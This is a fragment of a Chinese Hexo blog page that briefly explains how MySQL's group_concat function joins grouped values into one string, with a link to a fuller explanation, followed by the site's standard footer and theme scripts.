<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/8LCHPGYOTX9e53SycijT5Py2a73o5bRbPKRZ3eFnNtQ!/b/dL8AAAAAAAAA&amp;bo=pAXIAAAAAAADB0s!&amp;rf=viewer_4" alt></p>
<h1 id="group-concat函数："><a href="#group-concat函数：" class="headerlink" title="group_concat函数："></a>group_concat函数：</h1><p>group_concat函数的作用将同一个分组中的值连接起来，返回一个字符串结果，这样我们就不用麻烦的去移动偏移量了。<br><a href="http://www.cnblogs.com/lcamry/p/5715634.html" target="_blank" rel="noopener">函数具体介绍</a></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2021 JYP
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="http://bestwing.me" target="_blank">Sw'blog</a> by Swing
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style="display:none">
                        <span id="site-visit">海贼到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style="display:none">
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 24;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


    <script type="text/javascript">
      window.onload = function(){
        document.getElementById("search").onclick = function(){
            console.log("search")
            search();
        }
      }
      function search(){
        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');

        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
      }
    </script>

  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>